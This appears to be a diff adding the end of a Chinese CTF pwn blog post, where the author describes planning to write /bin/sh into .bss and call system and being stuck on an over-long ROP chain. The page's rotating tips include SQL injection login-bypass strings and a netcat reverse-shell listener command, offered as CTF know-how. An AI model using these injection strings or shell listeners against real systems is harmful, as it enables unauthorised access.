+<p>我们的目的：把 <code>/bin/sh</code> 写进 <code>.bss</code> 段，再调用 <code>system</code> 执行它。</p>
+<p>字节数一直超出限制，已卡在构造rop链好几个小时了</p>
+<!-- pages: 8 -->
+</div>
+
+        
+        <div class="post-tags">
+          <span class="post-tags-label">#</span>
+          
+          <a class="chip" href="/tags/Pwn/">Pwn</a>
+          
+          <a class="chip" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>
+          
+          <a class="chip" href="/tags/ROP/">ROP</a>
+          
+          <a class="chip" href="/tags/ret2text/">ret2text</a>
+          
+          <a class="chip" href="/tags/OOB/">OOB</a>
+          
+          <a class="chip" href="/tags/pwntools/">pwntools</a>
+          
+        </div>
+        
+
+        <div class="post-end">
+          <span class="post-end-line"></span>
+          <span class="post-end-text">EOF</span>
+          <span class="post-end-line"></span>
+        </div>
+
+        <nav class="post-nav">
+          
+          <a class="post-nav-item" href="/2026/11/20/pwn-rop-ret2text/">
+            <span class="post-nav-dir">← 上一篇</span>
+            <span class="post-nav-title">pwn--rop+ret2text</span>
+          </a>
+          
+          
+          <a class="post-nav-item post-nav-next" href="/2026/11/20/pwn-int-overflow/">
+            <span class="post-nav-dir">下一篇 →</span>
+            <span class="post-nav-title">pwn1--整数溢出</span>
+          </a>
+          
+        </nav>
+
+        
+
+<section class="comments" id="comments">
+  <div class="comments-head">
+    <h2 class="comments-title"><span class="t-prompt">//</span> 评论</h2>
+    <span class="comments-sub">用 GitHub 账号登录后发言</span>
+  </div>
+  <div class="giscus-wrap">
+    <script src="https://giscus.app/client.js"
+      data-repo="whymm-fl/whymm-fl.github.io"
+      data-repo-id="R_kgDOVvROcA"
+      data-category="Announcements"
+      data-category-id="DIC_kwDOVvROcM4DLPtx"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="dark"
+      data-lang="zh-CN"
+      crossorigin="anonymous"
+      async>
+    </script>
+  </div>
+</section>
+
+
+      </div>
+
+      
+      <aside class="post-aside">
+        <div class="toc-wrap">
+          <div class="toc-title"><span>目录</span><b>TOC</b></div>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2"><span class="toc-text">pwn–格式化字符串泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-OOB"><span class="toc-text">pwn–rop+OOB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a></li></ol></li></ol>
+        </div>
+      </aside>
+      
+    </div>
+  </div>
+</article>
+</main>
+  
+
+<section class="quote-band" aria-label="名言与小知识">
+  <div class="wrap">
+    <div class="quote-card" id="quoteCard">
+      <div class="quote-mark" aria-hidden="true">&ldquo;</div>
+      
+      <p class="quote-text" id="quoteText">Talk is cheap. Show me the code.</p>
+      <p class="quote-author" id="quoteAuthor">&mdash; Linus Torvalds</p>
+      
+      
+      <p class="quote-tip"><span class="quote-tip-label">// 小知识</span><span id="quoteTip">拿到 RSA 密文先看长度：e、n 大小不对劲往往就是攻击点。</span></p>
+      
+    </div>
+  </div>
+</section>
+<script type="application/json" id="quoteData">{"quotes":[{"text":"Talk is cheap. Show me the code.","author":"Linus Torvalds"},{"text":"Simplicity is prerequisite for reliability.","author":"Edsger W. Dijkstra"},{"text":"Premature optimization is the root of all evil.","author":"Donald Knuth"},{"text":"Programs must be written for people to read, and only incidentally for machines to execute.","author":"Harold Abelson"},{"text":"Security is a process, not a product.","author":"Bruce Schneier"},{"text":"Debugging is twice as hard as writing the code in the first place.","author":"Brian W. Kernighan"},{"text":"Any sufficiently advanced technology is indistinguishable from magic.","author":"Arthur C. Clarke"},{"text":"Make it work, make it right, make it fast.","author":"Kent Beck"},{"text":"纸上得来终觉浅，绝知此事要躬行。","author":"陆游"},{"text":"Stay hungry, stay foolish.","author":"Steve Jobs"},{"text":"落日心犹壮，秋风病欲苏。","author":"杜甫"},{"text":"为天地立心，为生民立命，为往圣继绝学，为万世开太平。","author":"张载"},{"text":"应是天仙狂醉，乱把白云揉碎。","author":"李白"}],"tips":["\u003ccode\u003ecurl -s -o /dev/null -w \"%{http_code}\" \u0026lt;url\u0026gt;\u003c/code\u003e 只看状态码，批量探活很省事。","\u003ccode\u003epython3 -m http.server 8000\u003c/code\u003e 一句话起个文件服务，传 payload 最方便。","\u003ccode\u003estrings -n 8 ./chall | less\u003c/code\u003e 先抓二进制里的可见字符串，比手动翻快得多。","\u003ccode\u003ebinwalk -e firmware.bin\u003c/code\u003e 解固件，\u003ccode\u003eexiftool pic.jpg\u003c/code\u003e 看图片元数据。","\u003ccode\u003etcpdump -i any -w out.pcap port 80\u003c/code\u003e 抓包，Wireshark 里按 \u003ccode\u003ehttp.request\u003c/code\u003e 过滤。","登录框先试 \u003ccode\u003e' or 1=1-- -\u003c/code\u003e、\u003ccode\u003eadmin' -- -\u003c/code\u003e，能进就是字符型注入。","\u003ccode\u003egit log -p --all\u003c/code\u003e 能在 \u003ccode\u003e.git\u003c/code\u003e 泄露的题目里翻出被删掉的 flag。","\u003ccode\u003enc -lvnp 4444\u003c/code\u003e 起监听前，先确认目标能不能出网。","拿到 RSA 密文先看长度：e、n 大小不对劲往往就是攻击点。","\u003ccode\u003egrep -rn \"flag{\" .\u003c/code\u003e 是赛后复盘找遗漏的最快方式。"]}</script>
+
+
+  <footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-about">
+        <div class="footer-brand">whymm<span class="caret">_</span></div>
+        <p class="footer-motto">Stay curious, keep pwning.</p>
+      </div>
+      <div class="footer-nav">
+        <div class="footer-nav-col">
+          <div class="footer-label">// 导航</div>
+          
+          <a href="/">首页</a>
+          
+          <a href="/archives/">归档</a>
+          
+          <a href="/categories/">分类</a>
+          
+          <a href="/tags/">标签</a>
+          
+          <a href="/about/">关于</a>
+          
+        </div>
+        <div class="footer-nav-col">
+          <div class="footer-label">// 联系</div>
+          
+          <a href="https://github.com/whymm-fl" target="_blank" rel="noopener">GitHub</a>
+          
+          
+          <a href="/atom.xml">RSS 订阅</a>
+          <a href="/sitemap.xml">站点地图</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <span>© 2026 whymm</span>
+      <span class="dot-sep">·</span>
+      <span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a></span>
+      <span class="dot-sep">·</span>
+      <span>Theme <b>whymm</b></span>
+      
+      <span class="footer-stats" id="busuanzi_container_site_pv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_pv">0</span> 次访问</span>
+      <span class="footer-stats" id="busuanzi_container_site_uv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_uv">0</span> 位访客</span>
+      
+    </div>
+  </div>
+</footer>
+
+  <div class="search-layer" id="searchLayer" aria-hidden="true">
+  <div class="search-backdrop" data-close="search"></div>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-head">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      <input id="searchInput" type="search" placeholder="搜索标题、分类、标签或正文…" autocomplete="off" spellcheck="false" data-search-url="/search.json">
+      <button class="search-close" type="button" data-close="search" aria-label="关闭">ESC</button>
+    </div>
+    <div class="search-body" id="searchResults">
+      <div class="search-empty">
+        <div class="search-empty-icon">⌘K</div>
+        <p>输入关键词开始搜索</p>
+        <span>支持标题、分类、标签与正文全文匹配</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <button class="to-top" id="toTop" type="button" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+  </button>
+  <div class="img-viewer" id="imgViewer" aria-hidden="true"><img alt=""></div>
+  <script src="/js/main.js" defer></script>
+  <script src="/js/search.js" defer></script>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</body>
+</html>
